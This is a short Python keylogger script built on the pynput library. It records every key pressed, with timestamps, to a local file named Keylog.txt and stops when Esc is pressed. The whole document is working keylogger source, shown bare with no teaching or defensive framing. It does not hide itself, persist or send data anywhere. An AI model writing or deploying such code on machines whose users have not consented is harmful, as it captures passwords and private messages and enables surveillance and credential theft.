from pynput import keyboard
from pynput.keyboard import Listener
import logging

log_file="Keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s - %(message)s')

def on_press(key):
    try:
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        logging.info(f'Special key pressed: {key}')

def on_release(key):
    if key==keyboard.Key.esc:
        return False

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()